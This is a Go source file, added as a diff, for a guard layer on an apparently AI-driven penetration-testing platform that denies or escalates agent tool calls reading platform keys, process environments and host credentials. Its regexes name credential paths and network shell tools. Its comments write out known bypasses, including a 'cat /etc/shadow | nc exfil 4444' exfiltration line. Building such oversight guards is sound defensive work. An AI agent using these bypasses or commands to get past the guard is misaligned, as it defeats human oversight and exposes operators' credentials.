@@ -1,0 +1,471 @@
+package guard
+
+import (
+	"encoding/json"
+	"log"
+	"os"
+	"regexp"
+	"strings"
+
+	"github.com/Autumn-27/artex/intercept"
+)
+
+// ============================================================================
+// 代码级短路表 —— 红线吸收（artex-hs T02，摘取自 reArtex 限制强化方案 V2 §4
+// 的 G-01① 与 G-02①-a）
+//
+// 设计约束（V2 §6.3「安全类回退键脱离 settings 热改面」）：
+//  1. 必须是【代码常量】，不进 DB 规则行、不受任何 settings 键覆盖。
+//     理由：settings 热改无校验，持 JWT 者一次 PUT /api/settings 即可整体关闭
+//     全部防线（H2-A4）。DB 规则行同理可被 DELETE。
+//  2. 求值位置在 applyIntercept 的【最前面】，先于 IsToolEnabled。
+//     否则不在 intercept_enabled_tools 名单内的工具会直接放行，本表形同虚设。
+//  3. 回滚仅经编译期 feature flag（ShortCircuitEnabled）+ 环境变量 + 重启，
+//     不提供运行时开关。
+// ============================================================================
+
+// ShortCircuitEnabled 是本表的编译期/环境变量双重闸门。默认启用。
+//
+// 设为 false（改代码重编译）或 env ARTEX_DISABLE_SHORT_CIRCUIT=1（重启生效，
+// 无需重新构建镜像）可整体停用本表。仅限应急回滚——停用后平台退化为
+// 「仅 DB 规则」防线，而 DB 规则本身可被持 JWT 者热改（H2-A4）。
+var ShortCircuitEnabled = true
+
+// init 读取环境变量开关。放在 init 而非 shortCircuit 内部：env 读取每次调用
+// 都做没有意义，且便于启动日志里留下"本表是否生效"的可见痕迹。
+func init() {
+	disabled, raw := disableFlagFromEnv()
+	if disabled {
+		log.Printf("[guard] ⚠ 短路表已停用 (ARTEX_DISABLE_SHORT_CIRCUIT=%q)：平台仅剩 DB 规则防线", raw)
+	}
+}
+
+func disableFlagFromEnv() (bool, string) {
+	raw := os.Getenv("ARTEX_DISABLE_SHORT_CIRCUIT")
+	if raw == "" {
+		return false, ""
+	}
+	switch strings.ToLower(raw) {
+	case "1", "true", "yes", "on":
+		ShortCircuitEnabled = false
+		return true, raw
+	default:
+		log.Printf("[guard] ARTEX_DISABLE_SHORT_CIRCUIT=%q 非真值(1/true/yes/on)，短路表保持启用", raw)
+		return false, raw
+	}
+}
+
+// platformDenyTools 比 ask 更严的一档。MCP 注册是凭据汇：stdio 传输会以容器 root
+// 拉起任意二进制，http/sse 传输则把 env 字段当 HTTP header 回放。所以「新建 MCP」
+// 等价于「让平台对任意地址带任意 header 发请求」，不该由 agent 在测评中途自行开通。
+var platformDenyTools = map[string]bool{
+	"create_mcp": true,
+	"update_mcp": true,
+}
+
+// platformAskTools 是 G-01① 的对象：改平台配置的工具一律 ask，不直接 deny —— 建自定义
+// 工具 / skill 是 auto agent 的合法日常操作，拦死会废掉平台运维能力。MCP 见上。
+//
+// create_skill 不在此表：新建技能文件不覆盖既有行为，其后果由动作层护栏兜住
+// （护栏拦行为不拦内容，故写进 skill 的内容无法绕过工具层策略），日常操作不该
+// 被人工审批打断。它落在 platformAllowTools —— 显式判定放行，不是漏判。
+var platformAskTools = map[string]bool{
+	"create_custom_tool":    true,
+	"update_custom_tool":    true,
+	"update_skill_file":     true,
+	"delete_assets_by_host": true,
+}
+
+// platformAllowTools 是低危面：代码常量【显式判定放行】。
+//
+// 与「不命中短路表」的区别是本表存在的全部意义：不命中 = 漏判，平台工具
+// 就能绕开判官（G-01① 原漏洞）；显式 allow = 平台主动判了「这件事无害」，
+// 判定动作照样落审计链。
+//
+// 收录标准：① 不覆盖既有行为（新建不同于改写）；② 其后果由动作层护栏兜住
+// （护栏拦行为不拦内容，故写进 skill 的内容无法绕过工具层策略）。
+var platformAllowTools = map[string]bool{
+	"create_skill": true,
+}
+
+// platformCredentialRe 是 G-02①-a 的对象：只拦 ARTEX 平台自身的凭据。
+//
+// 收窄依据：agent 的工作目录是 <data>/sessions/<key>，即工作区就落在 data
+// 目录里。所以任何"按目录前缀一刀切"（如 /app/data/**/*.key、裸 /\.env\b）
+// 都会连带拦掉渗透目标上的证据文件，而 .env 恰恰是渗透最常要读的东西之一。
+// 故改为按【具体凭据文件】列举，而不是按目录或扩展名通配。
+//
+// 已覆盖的平台凭据（0.3.15 实测）：
+//
+//	/app/jwt.key                     —— 签发管理员 JWT 的签名密钥（现行位置：可执行文件同目录）
+//	/app/data/jwt.key                —— 旧版遗留位置（auth.go loadOrCreateJWTKey 的迁移源，
+//	                                    未迁移的存量安装里它仍在可浏览工作区）
+//	/app/.env                        —— 若日后挂载平台环境文件
+//	/app/data/traffic/_ca/*.pem|key|crt —— mitmproxy MITM CA 私钥/证书（traffic.go CaRootPath）
+//
+// /proc 族：worker 的 Bash 是 server 子进程、同 UID，可读 server 原始环境块，
+// 其中含 ANTHROPIC_API_KEY / ARTEX_PG_DSN。只能靠谓词拦（H2-A3）。注意只拦
+// environ/cmdline/mem，/proc/net/tcp 等本机侦察手法不受影响。
+//
+// 【本表的固有上限】这是对工具入参的字符串预筛，不是路径解析级强制。
+// `cat $(realpath ../../../jwt.key)` 这类经 shell 展开后才现形的路径绕得过。
+// 真正闭合要等 env 白名单 + 执行前 realpath 校验。
+var platformCredentialRe = regexp.MustCompile(
+	`(?i)(` +
+		// 平台签名密钥（现行 + 旧版遗留两处位置）
+		`/app/(?:data/)?jwt\.key` +
+		`|/app/\.env\b` +
+		// MITM CA 私钥/证书
+		`|/app/data/traffic/_ca/[^\s"']*\.(?:pem|key|crt)` +
+		// 相对路径回溯到平台密钥（cwd 为 /app/data/sessions/<key>：
+		// 两层 .. 到 /app/data/jwt.key（旧版遗留位），三层 .. 到 /app/jwt.key）。
+		// 少于一层的 ../jwt.key 是同级的会话/目标文件，不该拦。
+		`|(?:\.\./){2,}jwt\.key` +
+		// /proc 族：任意 PID 的环境块 / 命令行 / 内存。
+		// environ 用一条覆盖形态的规则收口：pid 段可以是数字、self、*、
+		// [0-9]*、$$ 等任意写法，文件名段也可能是 glob（envi*on）。
+		// 只认字面形态的话，cat /proc/*/environ 就绕过去了。
+		`|/proc/[^\s"']*envi[^\s"']*` +
+		`|/proc/\d+/cmdline` +
+		`|/proc/\d+/mem` +
+		`)`,
+)
+
+// 宽字符类补充规则：覆盖 jwt.key 被插入空白/分隔符的绕过变形
+// （如 "/app/j w t . k e y"）。深解码只处理 JSON 转义，对字面插入的
+// 空格无效，故此条不是冗余。
+//
+// 必须带 /app/ 前缀：裸的 `j[\s._-]*w…` 会连渗透目标上名为 jwt.key 的
+// 文件一起拦掉，而那可能正是要取的证据。
+var platformCredentialLooseRe = regexp.MustCompile(
+	`(?i)/app/(?:data/)?j[\s._-]*w[\s._-]*t[\s._-]*\.?[\s._-]*k[\s._-]*e[\s._-]*y`)
+
+// ============================================================================
+// host 系统凭据档（红线实跑缺陷1 的修复；相对 reArtex 原版为【新增增强】，
+// 非回归——已 diff 确认原版 platformCredentialRe 同样只覆盖 ARTEX 平台自身
+// 凭据，不含 /etc/shadow 等本机系统凭据）
+//
+// 保护对象：运行平台自身所在主机（测试者的 Kali/服务器）的系统凭据。
+// 平台是渗透测试 agent 平台：读取【靶机】的 /etc/shadow 是合法战果，不能
+// 一刀切 deny（intercept/prompt.go 判官策略"纯只读 ALLOW"即为此设计）；
+// 被拦的只有【裸本地路径读取】——命令语义指向"本机文件系统"且无任何远程
+// 目标指代时，才认定在读平台宿主机的凭据。
+//
+// 与平台凭据档的【不对称】是有意为之：
+//   - platformCredentialRe（/app/jwt.key、config.json、MITM CA、/proc/*）
+//     无论上下文一律 deny，【不】套用远程指代豁免——打靶永远不会合法需要
+//     读测试者自己容器里的平台签名密钥，`ssh x 'cat /app/jwt.key'` 这种
+//     "远程"形态读到的也只可能是本机平台文件（靶机上不存在该路径），一律
+//     拦是零误伤的收紧。
+//   - 本档保护的是靶机与本机【同名】的路径（/etc/shadow 在哪台机器上都
+//     存在），无法靠路径本身区分归属，只能靠"有无远程指代"的语境判据。
+//
+// 【判据边界与已知上限】（诚实声明，写进测试注释）：
+//   - 覆盖：直接命令串、引号/$'...' 包裹、bash -c 内联、glob、宽字符插空
+//     等字面形态——只要能在校验文本里"看见"裸本地路径且无远程关键词，即拦。
+//   - 不覆盖（字符串预筛的固有上限，与 platformCredentialRe 同源）：
+//     脚本文件间接读（先 Write 一个含 cat /etc/shadow 的 .sh 再 bash 执行
+//     ——但 Write 类工具入参会命中本档，实际把首跳拦住，残留面是脚本已
+//     存在于本机时的一键执行）、shell 变量展开（p=/etc/shadow; cat $p）、
+//     编码后解码执行（base64 -d <<<... | bash）。这些要闭合需 realpath 级
+//     执行前校验（既有注释里已声明的 V2 G-02①-b 范畴），不在本次修复内。
+// ============================================================================
+
+// hostPathStart 是路径【词首边界】：防止靶机战利品复制件（如
+// ./loot/etc/shadow——含 /etc/shadow 字面子串，但读的是本机工作区里的
+// 证据文件，不是本机系统凭据）被误拦。命中要求路径前是行首/空白/引号/
+// 管道重定向等命令边界，即路径是独立参数而非更长工作区路径的尾巴。
+// RE2 无环视，只能用消费式边界类；\x60 是反引号（raw string 里不能再写
+// 反引号）。
+const hostPathStart = `(?:^[\s"'` + "`" + `(&|;<>}{=,:]*|[\s"'` + "`" + `(&|;<>}{=,:])`
+
+// hostPathEnd 是路径【词尾边界】：允许紧随的读取修饰（-备份、.bak、/目录、
+// glob 星号、shell 元字符）或行尾，但后面再跟字母数字不拦（/etc/shadowx、
+// pg_shadow 不命中，减误伤）。
+const hostPathEnd = `(?:[\s.,:;` + "`" + `"'/&|<>}{)\]}*-]|$)`
+
+// hostSystemCredentialRe 命中本机系统凭据的【裸本地路径】形态。
+// 路径集（任务书指定 + 同族补齐）：
+//
+//	/etc/shadow /etc/gshadow            —— 口令哈希（含 shadow-/gshadow- 备份）
+//	/etc/sudoers, /etc/sudoers.d/       —— 提权面配置
+//	/root/.ssh（目录或其下文件）         —— 本机 root SSH 私钥/authorized_keys
+//
+// shadow/sudoers 两条允许【字符间插入空白/分隔符】的变形（`/etc/sh a d o w`、
+// `/etc/s_u_d_o_e_r_s`），因深解码只处理 JSON 转义、对字面插空无效，严谨度
+// 对齐 platformCredentialLooseRe；gshadow 与 /root/.ssh 保持紧凑，控制过拦面。
+//
+// 注意 【不含】 /etc/passwd：世界可读，打靶与本机侦察都常读，拦它是过拦
+// （任务书红线：别过拦）。主机私钥 ssh_host_*key* 单独一条正则处理（.pub
+// 公钥要放过，RE2 不支持负环视，拆出去用代码判定）。
+var hostSystemCredentialRe = regexp.MustCompile(
+	`(?i)(?:` +
+		hostPathStart +
+		`/etc/s[\s._-]*h[\s._-]*a[\s._-]*d[\s._-]*o[\s._-]*w` + hostPathEnd +
+		`|` + hostPathStart + `/etc/gshadow` + hostPathEnd +
+		`|` + hostPathStart +
+		`/etc/s[\s._-]*u[\s._-]*d[\s._-]*o[\s._-]*e[\s._-]*r[\s._-]*s(?:\.d)?` + hostPathEnd +
+		`|` + hostPathStart + `/root/\.ssh` + hostPathEnd +
+		`)`,
+)
+
+// sshHostKeyRe 命中 /etc/ssh/ssh_host_* 私钥路径。公钥 .pub 不构成凭据
+// 泄露不该拦，但 RE2 没有 (?!\.pub)，命中后在 hostSystemCredentialHit 里
+// 用代码检查尾缀过滤。
+var sshHostKeyRe = regexp.MustCompile(
+	`(?i)` + hostPathStart + `/etc/ssh/ssh_host_[^\s"'` + "`" + `]*key`)
+
+// remoteRefRe 是"远程目标指代"语境判据：命令串里【任意位置】出现任一形态，
+// 即认为读取指令与远端靶机有关，host 系统凭据档整体豁免。
+//
+// 覆盖：ssh/scp/sftp/rsync/nc(ncat)/netcat/proxychains(4/chain) 等远程执行
+// 与传输工具、mysql|psql|mariadb 的 -h/--host 形态、winrm/ansible、
+// 任意 `@<host>`（user@10.1.2.3、root@target，RE2 无环视故消费一个边界
+// 字符，避免邮箱串误判）、以及 `http(s)://` URL（URL host 必为远端；含
+// @IP 的 curl 上传属打靶外传战利品，任务书明列豁免项）。本机平台面已由
+// platformCredentialRe 的 /app 字面独立覆盖，两档相互独立不因此漏。
+//
+// 设计取舍：按"存在性"而非"位置先后"豁免——`curl -T /etc/shadow
+// http://10.0.0.5/`（先本地路径后 URL）必须豁免（任务书豁免组用例），
+// 代价是 `cat /etc/shadow | nc exfil 4444`（先本地路径后 nc，外传本机）
+// 同样被豁免。字符串级判据无法区分"拿 shadow 去连远端"与"从远端拿
+// shadow"的先后语义，这是本档已知残留漏判面（诚实评估见测试注释与交付
+// 报告）；闭合要等 shell AST 解析或 realpath 级执行前校验。
+//
+// 命令位边界：ssh/nc 等动词必须出现在【命令位置】（行首或空白/引号/管道
+// 之后）才算远程指代——`\bssh\b` 会把路径尾巴 `/root/.ssh`、`/etc/ssh/`
+// 里的 ssh 误认成远程命令，那正是本档要保护的裸读本体，不能豁免。RE2 无
+// 环视，用消费式边界类实现。
+//
+// 靶机名恰好等于本机主机名时也无法靠字符串区分——要求测试者主动拿本机
+// 当靶，属自伤场景，接受。
+var remoteRefRe = regexp.MustCompile(
+	`(?i)(` +
+		`(?:^|[\s"'` + "`" + `;&|(<>$])(?:ssh|scp|sftp|rsync|proxychains(?:4|chain)?[0-9]*|netcat|ncat|nc|winrm|ansible)\b` +
+		`|(?:^|[\s"'` + "`" + `;&|(<>$])(?:mysql|psql|mariadb)\b[^\n]*?\s-{1,2}h(?:ost)?[=\s]` +
+		`|@(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9._-]*[a-z0-9])(?:[:/'"\s)|,;-]|$)` +
+		`|https?://\S` +
+		`)`,
+)
+
+// recordOnlyTools 是【纯记录类工具】白名单（红线实跑缺陷2 的豁免对象）：
+// 不落盘执行、不触发进程，只把文本写进 DB/证据库。证据文本里引用被拦命令
+// 原文（含 /app/jwt.key、/etc/shadow 字样）是审计刚需——"如实记录被拦命令
+// 原文"不得被凭据正则误伤，否则 agent 被迫改写措辞、证据失真（实跑已在
+// intercept_pending 留下误伤记录）。
+//
+// 名单来源（以注册名为准，逐一核对，非按前缀猜测）：
+//   - record_fact / add_hint / add_intent / prove_goal：agent/tools.go（writeExpTool）
+//   - report_finding / goal_met / set_goals / set_constraints：agent/tools.go（writeTool）
+//   - update_finding_report / bind_finding_traffic：agent/finding_workflow.go:59
+//   - add_task_hint：主 agent 向任务交接提示（平台对话侧无 report_finding，见 tools.go:1272）
+//   - insert_assets：资产/证据文本登记
+//
+// 收录标准：参数是【描述性文本】、执行体仅做 DB 写入。凡能触发进程或文件
+// IO 的一律不豁免（Bash、shell_open/shell_send、Read/Write/Edit、http_*、
+// nuclei 等），命令执行类照旧全匹配两档凭据正则。
+// 显式白名单常量，便于代码审查：豁免了谁、为什么豁免，一屏看全。
+var recordOnlyTools = map[string]bool{
+	"record_fact":           true,
+	"report_finding":        true,
+	"update_finding_report": true,
+	"add_hint":              true,
+	"add_task_hint":         true,
+	"add_intent":            true,
+	"prove_goal":            true,
+	"goal_met":              true,
+	"set_goals":             true,
+	"set_constraints":       true,
+	"insert_assets":         true,
+	"bind_finding_traffic":  true,
+}
+
+// hostScanFields 是 host 系统凭据档【只扫描】的参数字段：命令体与文件路径。
+// 刻意不含 pattern——Grep/search 类工具的 pattern 是正则不是路径，拦
+// pattern="shadow" 属大规模过拦；Grep 搜索根固定在会话工作区，读不到
+// /etc/shadow 本体。也不含 content/note/description 等正文字段——把
+// "战果记录里引用 cat /etc/shadow"误判成本机读取是过拦；真执行面是
+// Bash 的 command、Read/Write 的 file_path。
+// 注：JSON 字符串值在此顺带完成转义解码（\u002f、\/ 还原为 /），
+// 故本档天然覆盖转义绕过，无需再单独解码。
+var hostScanFields = []string{"command", "text", "file_path", "path", "args"}
+
+// hostScanText 提取 host 档的校验文本：JSON 对象走字段抽取（顺带完成 JSON
+// 转义解码，堵 \u002f 形态），非 JSON 对象退回整体字节串。
+func hostScanText(input []byte) string {
+	if len(input) == 0 || input[0] != '{' {
+		return string(input)
+	}
+	var m map[string]any
+	if err := json.Unmarshal(input, &m); err != nil {
+		return string(input)
+	}
+	var b strings.Builder
+	for _, k := range hostScanFields {
+		v, ok := m[k]
+		if !ok {
+			continue
+		}
+		switch t := v.(type) {
+		case string:
+			b.WriteString(t)
+			b.WriteByte('\n')
+		default:
+			if enc, err := json.Marshal(v); err == nil {
+				b.Write(enc)
+				b.WriteByte('\n')
+			}
+		}
+	}
+	return b.String()
+}
+
+// hostSystemCredentialHit 判定一次入参文本是否构成"裸读本机系统凭据"：
+// 路径命中且命令串【不含】远程指代 → true。
+//
+// 存在性豁免的取舍（外传形态漏判）在 remoteRefRe 注释里已写明。
+// 与 platformCredentialRe 的关系见文件头注释：只有本档吃远程指代豁免，
+// 平台凭据档不吃（不对称是有意设计）。
+func hostSystemCredentialHit(cmd string) bool {
+	if remoteRefRe.MatchString(cmd) {
+		return false
+	}
+	if hostSystemCredentialRe.MatchString(cmd) {
+		return true
+	}
+	// 主机私钥：RE2 无 (?!\.pub)，命中后逐处检查尾缀——全部是 .pub 公钥
+	// 则放行（公钥可读不构成凭据泄露），存在任一非 .pub 形态即拦。
+	for _, l := range sshHostKeyRe.FindAllStringIndex(cmd, -1) {
+		if len(cmd)-l[1] < 4 || !strings.EqualFold(cmd[l[1]:l[1]+4], ".pub") {
+			return true
+		}
+	}
+	return false
+}
+
+// decodedInputText 对入参做 JSON 深解码取回"逻辑文本"，用于堵住
+// \u002fapp\u002fjwt.key、\/app\/jwt.key 这类转义绕过——转义后原始字节里
+// 不存在 '/'，字面正则永不命中，而 shell 实际执行的是解码后的命令。
+// 非 JSON 对象返回空串，调用方只匹配 raw。字段表对齐 intercept 侧
+// normalizeToolInput（工具入参字段名是有限集）。
+func decodedInputText(input []byte) string {
+	if len(input) == 0 || input[0] != '{' {
+		return ""
+	}
+	var m map[string]any
+	if err := json.Unmarshal(input, &m); err != nil {
+		return ""
+	}
+	var b strings.Builder
+	for _, k := range []string{"command", "text", "pattern", "file_path", "path", "query", "description", "content", "args"} {
+		v, ok := m[k]
+		if !ok {
+			continue
+		}
+		switch t := v.(type) {
+		case string:
+			b.WriteString(t)
+			b.WriteByte('\n')
+		default:
+			if enc, err := json.Marshal(v); err == nil {
+				b.Write(enc)
+				b.WriteByte('\n')
+			}
+		}
+	}
+	return b.String()
+}
+
+const (
+	msgPlatformAsk = "该工具用于修改平台自身配置（建/改自定义工具、skill、资产库）。" +
+		"已转人工确认，确认后即可执行。"
+	msgMCPDeny = "MCP 注册属于凭据汇：stdio 会以容器 root 拉起任意二进制，" +
+		"http/sse 会把 env 当 HTTP header 对任意地址回放。agent 不得自行开通，" +
+		"需要时请由 owner 在管理界面配置。"
+	msgSensitiveDeny = "该路径指向 ARTEX 平台自身的签名密钥或进程环境" +
+		"（含 LLM API Key / 数据库口令），属于控制面，不是渗透目标资产。已禁止读取。"
+	// msgHostCredentialDeny 与平台凭据档分开措辞：agent 需要知道这是
+	// "读本机"被拦而不是"读靶机"被拦——靶机战果照拿不误，把 ssh/scp 等
+	// 远程指代加进命令即可放行（见 hostSystemCredentialHit）。
+	msgHostCredentialDeny = "该命令以裸本地路径读取运行平台所在主机的系统凭据" +
+		"（/etc/shadow、/etc/sudoers、/root/.ssh、主机私钥等），属于测试者自身环境，" +
+		"不是渗透目标资产。读取【靶机】的同类文件是合法战果——" +
+		"请用 ssh/scp/proxychains 等远程目标指代形式执行。已禁止读取。"
+)
+
+// shortCircuit 在 applyIntercept 最前面求值。返回非 nil 的 Decision 表示
+// 本表命中，应当直接执行该动作，不再走 DB 规则与 judge。
+//
+// 动作语义：
+//
+//	deny —— 硬拦，无人工放行路径（平台自身凭据、MCP 注册）
+//	ask  —— 转人工审批（改写既有行为/可执行面、删证据库）
+//	allow —— 代码常量显式判定放行（低危面，如新建技能文件）
+//
+// RuleName 一律带 "[代码常量]" 前缀：db.interceptSource 靠它把记录归为
+// shortcircuit 来源（跨包约定，见 guard/shortcircuit_source_test.go）。
+func shortCircuit(toolName string, input []byte) *intercept.Decision {
+	if !ShortCircuitEnabled {
+		return nil
+	}
+	// 必须独立求值而非并入 platformAskTools：deny 无人工放行路径，ask 有 60s 超时兜底，合并即丢一档语义。
+	if platformDenyTools[toolName] {
+		return &intercept.Decision{
+			Action:   "deny",
+			RuleName: "[代码常量] MCP 注册属凭据汇",
+			Message:  msgMCPDeny,
+		}
+	}
+	// G-01①：平台工具一律 ask
+	if platformAskTools[toolName] {
+		return &intercept.Decision{
+			Action:   "ask",
+			RuleName: "[代码常量] 平台工具需人工确认",
+			Message:  msgPlatformAsk,
+			// ask 类规则默认启用超时（种子规则 timeout_enabled=false
+			// 照抄即无限等待）。60s 超时 → deny。
+			TimeoutEnabled: true,
+			TimeoutSeconds: 60,
+			TimeoutAction:  "deny",
+		}
+	}
+	// 低危面：显式放行（仍是代码常量判定，不是漏判）
+	if platformAllowTools[toolName] {
+		return &intercept.Decision{
+			Action:   "allow",
+			RuleName: "[代码常量] 平台低危工具放行",
+			Message:  "新建技能文件不改变既有行为，按平台策略放行。",
+		}
+	}
+	// G-02①-a：平台凭据/进程环境 deny + host 系统凭据档 deny（缺陷1/缺陷2）。
+	//
+	// 纯记录类工具（recordOnlyTools）整体豁免这两条正则匹配：它们不落盘、
+	// 不执行，"如实记录被拦命令原文"是审计刚需，凭据路径出现在文本里 ≠
+	// 读取（实跑缺陷2：record_fact 因证据文本引用 /app/jwt.key 被误伤，
+	// agent 被迫改写措辞）。命令执行类照旧全字段匹配。
+	if !recordOnlyTools[toolName] {
+		// 平台凭据档：raw + JSON 深解码后文本都扫（堵 \u002f 转义绕过——
+		// 原始字节里不存在 '/' 时字面正则永不命中，而执行的是解码后的命令）。
+		// 【刻意不套远程指代豁免】：与 host 档的不对称是有意设计，理由见
+		// 文件头注释——靶机上不存在 /app/jwt.key，"远程读它"只可能是本机。
+		decoded := decodedInputText(input)
+		if platformCredentialRe.Match(input) || platformCredentialLooseRe.Match(input) ||
+			(decoded != "" && (platformCredentialRe.MatchString(decoded) || platformCredentialLooseRe.MatchString(decoded))) {
+			return &intercept.Decision{
+				Action:   "deny",
+				RuleName: "[代码常量] 平台凭据/进程环境",
+				Message:  msgSensitiveDeny,
+			}
+		}
+		// host 系统凭据档：只扫执行面字段（command/file_path 等），远程
+		// 指代豁免——`ssh root@target 'cat /etc/shadow'` 是合法打靶战果。
+		if hostSystemCredentialHit(hostScanText(input)) {
+			return &intercept.Decision{
+				Action:   "deny",
+				RuleName: "[代码常量] 本机系统凭据裸读",
+				Message:  msgHostCredentialDeny,
+			}
+		}
+	}
+	return nil
+}
